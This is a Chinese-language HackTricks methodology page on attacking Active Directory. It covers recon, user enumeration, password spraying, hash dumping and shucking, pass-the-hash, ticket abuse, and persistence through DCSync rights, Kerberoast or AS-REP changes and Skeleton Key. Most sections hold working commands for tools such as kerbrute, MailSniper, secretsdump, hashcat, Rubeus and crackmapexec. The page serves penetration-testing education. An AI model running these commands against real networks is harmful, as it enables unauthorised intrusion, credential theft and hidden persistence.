# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使 **网络管理员** 能够在网络中高效地创建和管理 **域（domains）**、**用户（users）** 和 **对象（objects）**。它被设计为可扩展，将大量用户组织为可管理的 **组（groups）** 和 **子组（subgroups）**，并在不同层级上控制 **访问权限（access rights）**。

**Active Directory** 的结构由三个主要层级组成：**域（domains）**、**树（trees）** 和 **林（forests）**。**域** 包含一组对象（如 **users** 或 **devices**），共享一个公共数据库。**树** 是由具有共同结构的域组成的分组，而**林** 则表示多个树的集合，这些树通过 **trust relationships** 相互连接，形成组织结构的最上层。可以在每个层级上指定特定的 **访问** 和 **通信权限**。

Active Directory 的关键概念包括：

1. **Directory** – 存放所有与 Active Directory 对象相关的信息。
2. **Object** – 目录中的实体，包括 **users**、**groups** 或 **shared folders**。
3. **Domain** – 用于容纳目录对象的容器，一个 **forest** 中可以存在多个 **domains**，每个域维护自己的对象集合。
4. **Tree** – 共享根域的域的分组。
5. **Forest** – Active Directory 中的组织结构顶层，由多个相互之间具有 **trust relationships** 的树组成。

**Active Directory Domain Services (AD DS)** 包含一系列对于集中管理和网络内通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中存储数据并管理 **users** 与 **domains** 之间的交互，包括 **authentication** 和 **search** 功能。
2. **Certificate Services** – 管理安全 **digital certificates** 的创建、分发与维护。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持启用目录的应用程序。
4. **Directory Federation Services** – 提供 **single-sign-on** 能力，使用户在单次会话中对多个 web 应用进行认证。
5. **Rights Management** – 通过控制未授权的分发与使用来帮助保护版权材料。
6. **DNS Service** – 对 **domain names** 的解析至关重要。

更详细的说明请查看: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos 认证**

要学会如何 attack an AD，你需要非常了解 Kerberos 认证过程。  
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## 速查表

你可以访问 https://wadcoms.github.io/ 来快速查看可用于 enumerate/exploit an AD 的命令。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

如果你可以访问 AD 环境但没有任何 credentials/sessions，你可以：

- **Pentest the network:**
- 扫描网络，发现主机和开放端口，并尝试 **exploit vulnerabilities** 或 **extract credentials**（例如，[printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可以提供有关域内关键服务器（如 web、printers、shares、vpn、media 等）的信息。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看 General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获取有关如何执行此操作的更多信息。
- **Check for null and Guest access on smb services**（这在现代 Windows 版本上不起作用）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 更详细的 SMB 枚举指南见：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 更详细的 LDAP 枚举指南见（注意 **anonymous access**）：

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 从域内的内部文档、社交媒体、服务（主要是 web）以及公开可用资源中提取用户名/姓名。
- 如果你找到了公司员工的完整姓名，可以尝试不同的 AD **username conventions**（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的命名约定有：_NameSurname_, _Name.Surname_, _NamSur_（每部分 3 个字母）, _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 以及 3 个随机字母加 3 个随机数字（abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** 查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求一个 **invalid username** 时，服务器会使用 **Kerberos error** 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 响应，从而让我们判断该用户名无效。**Valid usernames** 会引发要么 **TGT in a AS-REP** 响应，要么错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要进行 pre-authentication。
- **No Authentication against MS-NRPC**: 在 domain controllers 上对 MS-NRPC (Netlogon) 接口使用 auth-level = 1 (No authentication)。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以在没有任何 credentials 的情况下检查用户或计算机是否存在。工具 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 实现了这种类型的枚举。相关研究可以在此处找到：[here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) 服务器**

如果在网络中发现其中一台服务器，你还可以针对它执行 **user enumeration**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **公司员工的姓名** from the recon 步骤 you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

好吧，所以你已经知道了一个有效的 username 但没有密码…… 那么尝试：

- [**ASREPRoast**](asreproast.md): 如果某用户**没有**属性 _DONT_REQ_PREAUTH_，你可以**请求一个 AS_REP message**给该用户，消息将包含一些由该用户密码派生后加密的数据。
- [**Password Spraying**](password-spraying.md): 对每个已发现的用户尝试最常见的**密码**，也许有些用户使用了弱密码（注意密码策略！）。
- 注意你也可以**spray OWA servers**来尝试获取用户的 mail servers 的访问权限。

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能能够**获取**一些用于破解的挑战**hashes**，通过对**网络**的某些协议进行**poisoning**：

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **更多的邮箱地址并对网络有更好的理解**。You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- 使用 **`nxcdb` workspaces** 在每次 engagement 中保存 AD recon 状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下为每个协议生成 SQLite DB（smb/mssql/winrm/ldap/etc）。用 `proto smb|mssql|winrm` 切换视图，用 `creds` 列出收集到的 secrets。完成后手动清除敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。
- 使用 **`netexec smb <cidr>`** 快速发现子网，可显示 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的主机易受 **relay-prone** 攻击，而 DCs 通常要求签名。
- 从 NetExec 输出直接生成 **hostnames in /etc/hosts** 以便于定位目标：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 **SMB relay to the DC is blocked** by signing 时，仍要探测 **LDAP** 的姿态：`netexec ldap <dc>` 会显示 `(signing:None)` / 弱的 channel binding。对 SMB 要求 signing 但对 LDAP 禁用 signing 的 DC 仍然是可行的 **relay-to-LDAP** 目标，可被滥用（例如 **SPN-less RBCD**）。

### 客户端打印机凭证 leaks → 批量域凭证验证

- Printer/web UIs 有时会在 HTML 中**嵌入掩码的管理员密码**。查看 source/devtools 可揭示明文（例如 `<input value="<password>">`），从而允许通过 Basic-auth 访问扫描/打印存储库。
- 检索到的打印任务可能包含带有每用户密码的**明文入职文档**。测试时保持配对一致：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### 窃取 NTLM 凭证

如果你可以用 **null 或 guest 用户** 访问其他 PC 或共享，你可以 **放置文件**（例如一个 SCF file），当这些文件被访问时会触发针对你的 **NTLM 认证**，从而让你能够**窃取 NTLM challenge** 并破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已拥有的每个 NT hash 视为针对其他较慢格式的候选密码，这些格式的密钥材料直接由 NT hash 派生。与其在 Kerberos RC4 ticket、NetNTLM 挑战或缓存凭证中对长口令进行暴力破解，不如将 NT hashes 输入到 Hashcat 的 NT-candidate 模式，让它验证密码重用而无需知道明文。尤其在域被攻破后，你可以收集成千上万的当前和历史 NT hashes，这个方法非常有效。

何时使用 shucking：

- 你拥有来自 DCSync、SAM/SECURITY 转储或凭证保管库的 NT 语料库，需要测试在其他域/林中的重用情况。
- 你捕获到基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM 响应，或 DCC/DCC2 blob。
- 你想快速证明对于长且难以破解的口令存在重用，并立即通过 Pass-the-Hash 枢转。

该技术**不适用于**密钥不是 NT hash 派生的加密类型（比如 Kerberos etype 17/18 AES）。如果域强制只使用 AES，你必须回退到常规密码模式。

#### 构建 NT hash 语料库

- **DCSync/NTDS** – 使用 `secretsdump.py` 带历史记录抓取尽可能多的 NT hashes（以及它们的历史值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目显著扩大候选池，因为 Microsoft 每个账户最多可以存储 24 个之前的 hash。有关更多收集 NTDS secrets 的方法请见：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）可提取本地 SAM/SECURITY 数据和缓存的域登录（DCC/DCC2）。去重并把这些 hashes 附加到同一份 `nt_candidates.txt` 列表中。
- **跟踪元数据** – 保留产生每个 hash 的用户名/域（即使字典仅包含十六进制）。一旦 Hashcat 打印出成功的候选项，匹配的 hash 会立即告诉你哪个主体在重用密码。
- 优先选择来自同一林或受信任林的候选项；这会最大化 shucking 时的重合概率。

#### Hashcat NT-candidate 模式

| 哈希类型                                | 密码模式 | NT 候选模式 |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate 输入**必须保持原始 32 十六进制 NT hashes**。禁用规则引擎（不要用 `-r`，不要用混合模式），因为变形会破坏候选密钥材料。
- 这些模式本身并不更快，但 NTLM 密钥空间（例如在 M3 Max 上约 30,000 MH/s）比 Kerberos RC4（约 300 MH/s）快约 100×。测试经过策划的 NT 列表比在慢格式中探索整个密码空间便宜得多。
- 始终使用 **最新的 Hashcat 构建**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 最近才加入。
- 目前没有适用于 AS-REQ Pre-Auth 的 NT 模式，且 AES etypes（19600/19700）需要明文密码，因为它们的密钥是通过 PBKDF2 从 UTF-16LE 密码派生，而不是原始 NT hashes。

#### 示例 – Kerberoast RC4 (mode 35300)

1. 使用低权限用户捕获目标 SPN 的 RC4 TGS（详情见 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 用你的 NT 列表对 ticket 进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 从每个 NT 候选项派生 RC4 密钥并验证 `$krb5tgs$23$...` blob。匹配即确认该服务账户使用了你已有的某个 NT hash。

3. 立即通过 PtH 枢转：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

你也可以在之后用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文（如有需要）。

#### 示例 – 缓存凭证 (mode 31600)

1. 从已攻陷的工作站导出缓存登录：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的域用户的 DCC2 行拷贝到 `dcc2_highpriv.txt` 并进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功匹配会返回已在你列表中存在的 NT hash，证明缓存用户在重用密码。可直接用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）或在快速 NTLM 模式下离线用掩码/规则暴力破解以恢复明文。

完全相同的工作流适用于 NetNTLM 挑战-响应（`-m 27000/27100`）和 DCC（`-m 31500`）。一旦识别出匹配项，你可以发起中继、SMB/WMI/WinRM PtH，或用离线规则/掩码重新破解 NT hash。



## 在有凭证/会话的情况下枚举 Active Directory

在此阶段，你需要**已攻破某个有效域账号的凭证或会话**。如果你拥有某些有效凭证或以域用户的 shell，**请记住之前提到的那些选项仍然可用于攻破其他用户**。

在开始经过身份验证的枚举之前，你应该了解 **Kerberos double hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 枚举

攻破一个账号是**开始攻破整个域的重要一步**，因为你将能够开始进行 **Active Directory 枚举：**

关于 [**ASREPRoast**](asreproast.md) 你现在可以找到所有可能的易受攻击用户；关于 [**Password Spraying**](password-spraying.md) 你可以得到**所有用户名的列表**并尝试使用被攻破账号的密码、空密码或新的有潜力的密码。

- 你可以使用 [**CMD 来执行基本侦察**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell 进行侦察**](../basic-powershell-for-pentesters/index.html)，这会更隐蔽
- 你还可以 [**使用 powerview**](../basic-powershell-for-pentesters/powerview.md) 提取更详细的信息
- 另一个用于 Active Directory 侦察的很棒工具是 [**BloodHound**](bloodhound.md)。它**不太隐蔽**（取决于你使用的收集方法），但**如果你不在乎**隐蔽性，强烈推荐尝试。查找用户能 RDP 到哪里，找到通向其他组的路径等。
- **其他自动化 AD 枚举工具有：** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**。**
- [**AD 的 DNS 记录**](ad-dns-records.md)，因为其中可能包含有趣信息。
- 一个带 GUI 的目录枚举工具是来自 **SysInternal** 套件的 **AdExplorer.exe**。
- 你还可以使用 **ldapsearch** 在 LDAP 数据库中搜索字段 _userPassword_ & _unixUserPassword_ 中的凭证，甚至搜索 _Description_ 字段。参见 PayloadsAllTheThings 上关于 AD 用户注释中密码的条目（https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment）以获取其他方法。
- 如果你使用 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 来枚举域。
- 你也可以尝试以下自动化工具：
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

从 Windows 获取所有域用户名非常容易（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 上，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即使本章节看起来很短，它也是最重要的部分。访问那些链接（主要是 cmd、powershell、powerview 和 BloodHound 的链接），学习如何枚举域并反复练习直到熟练。在评估过程中，这将是找到通往 DA 的关键时刻，或决定无法继续的关键判断点。

### Kerberoast

Kerberoasting 涉及获取与服务绑定的用户账户使用的 **TGS tickets** 并离线破解它们的加密——该加密基于用户密码。

更多内容见：


{{#ref}}
kerberoast.md
{{#endref}}

### 远程连接（RDP、SSH、FTP、Win-RM 等）

一旦你获得了一些凭证，可以检查是否可以访问任何 **机器**。为此，你可以使用 **CrackMapExec** 根据端口扫描结果尝试用不同协议连接多个服务器。

### 本地权限提升

如果你以普通域用户的凭证或会话已被攻破，并且该用户对域内的任何机器有**访问权限**，你应尝试在本地提升权限并搜集凭证。因为只有拥有本地管理员权限，你才能**转储其他用户的哈希**（内存中的 LSASS 或本地 SAM）。

本书关于 [**Windows 本地权限提升**](../windows-local-privilege-escalation/index.html) 有完整章节，以及一份 [**检查清单**](../checklist-windows-privilege-escalation.md)。另外，别忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### 当前会话票据

在当前用户下找到能让你访问意外资源的 **tickets** 的可能性非常低，但你可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### 在计算机共享 | SMB Shares 中查找凭据

Now that you have some basic credentials you should check if you can **find** any **interesting files being shared inside the AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**点击此链接了解可用工具。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### 窃取 NTLM 凭据

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## 在 Active Directory 上使用特权凭据/会话进行权限提升

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrato**r you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 请注意，这相当**嘈杂**且**LAPS**可以**缓解**它。

### MSSQL Abuse & Trusted Links

如果用户有权限**访问 MSSQL 实例**，他可能能够利用它在 MSSQL 主机上**执行命令**（如果以 SA 运行）、**窃取** NetNTLM **hash** 或甚至执行 **relay** **attack**。\
此外，如果某个 MSSQL 实例被另一个 MSSQL 实例信任（database link）。如果用户对被信任的数据库有权限，他将能够**利用信任关系在另一个实例中也执行查询**。这些信任可以被串联，最终用户可能找到一个配置错误的数据库，在那里可以执行命令。\
**数据库之间的链接即使跨越 forest trusts 也能工作。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

第三方资产清单和部署套件通常会暴露通向凭据和代码执行的强大路径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现任何 Computer 对象具有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 并且你在该计算机上拥有域权限，你将能够从每个登录到该计算机的用户的内存中转储 TGT。\
因此，如果**Domain Admin 登录到该计算机**，你将能够转储他的 TGT 并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以**自动攻陷一个 Print Server**（希望它是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许使用“Constrained Delegation”，它将能够**以任何用户的身份模拟访问某台计算机上的某些服务**。\
然后，如果你**攻陷了该用户/计算机的 hash**，你将能够**以任何用户（甚至域管理员）的身份模拟访问某些服务**。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

在远程计算机的 Active Directory 对象上拥有 **WRITE** 权限可以使你获得以**提升权限**运行代码的能力：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被攻陷的用户可能对某些域对象拥有一些**有趣的权限**，这些权限可能让你随后**横向移动/提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

在域内发现**Spool 服务在监听**可以被**滥用**以**获取新凭证**并**提升权限**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果**其他用户**访问**被攻陷的**机器，就有可能**从内存中收集凭证**，甚至**将 beacons 注入到他们的进程中**以冒充他们。\
通常用户会通过 RDP 访问系统，下面介绍如何对第三方 RDP 会话执行几种攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一个管理域联接计算机上**本地 Administrator 密码**的系统，确保其**随机化**、唯一且经常**更改**。这些密码存储在 Active Directory 中，并通过 ACL 控制对授权用户的访问。拥有足够权限访问这些密码后，就可以对其他计算机进行 pivot。

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**从被攻陷的机器收集证书**可能是提升环境内权限的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了**易受攻击的模板**，可以滥用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}

### Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦你获得 **Domain Admin** 或更高级别的 **Enterprise Admin** 权限，你就可以**转储**域数据库：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

之前讨论的一些技术可以用于持久化。\
例如你可以：

- 使用户易受 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 使用户易受 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 授予用户 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 使用 **NTLM hash**（例如 PC 帐户的 **hash**）来为特定服务创建一个合法的 Ticket Granting Service (TGS) ticket，从而**访问该服务的权限**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 涉及攻击者获取 Active Directory 环境中 krbtgt 帐户的 **NTLM hash**。该帐户用于签署所有 **Ticket Granting Tickets (TGTs)**，这些 TGT 对在 AD 网络中的认证至关重要。

一旦攻击者获得该 hash，他们就可以为选择的任何帐户创建 **TGTs**（即用于执行 Silver ticket 攻击）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这些类似于 golden tickets，但以一种**绕过常见 golden ticket 检测机制**的方式伪造。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有某个帐户的证书或能够请求它们**是持久化用户帐户（即使其更改密码）的一种非常好的方式：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用证书也可以在域内以高权限保持持久化：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过对这些特权组（例如 Domain Admins 和 Enterprise Admins）应用标准的 **Access Control List (ACL)** 来确保它们的安全，以防止未经授权的更改。然而，这一功能也可能被滥用；如果攻击者修改 AdminSDHolder 的 ACL，给予普通用户完全访问权限，该用户将对所有特权组获得广泛控制。这个旨在保护的安全措施可能因此适得其反，除非密切监控，否则会允许不当访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每台 **Domain Controller (DC)** 中都存在一个**本地管理员**帐户。通过在这样的机器上获取管理员权限，可以使用 **mimikatz** 提取本地 Administrator hash。随后需要修改注册表以**启用使用该密码**，从而允许远程访问本地 Administrator 帐户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以**授予**某个**用户**对某些特定域对象的**特殊权限**，这将允许该用户在未来**提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于**存储**对象对另一个对象所拥有的**权限**。如果你只对对象的 security descriptor 做一个**小改动**，就可以在不成为特权组成员的情况下获得该对象的非常有价值的权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` 辅助类创建带有 `entryTTL`/`msDS-Entry-Time-To-Die` 的短命主体/GPO/DNS 记录；它们会在没有 tombstones 的情况下自我删除，抹去 LDAP 证据，同时留下孤立的 SIDs、损坏的 `gPLink` 引用或缓存的 DNS 响应（例如，AdminSDHolder ACE 污染或恶意的 `gPCFileSysPath`/AD-integrated DNS 重定向）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

在内存中修改 **LSASS** 以建立一个**通用密码**，从而允许访问所有域帐户。


{{#ref}}
skeleton-key.md
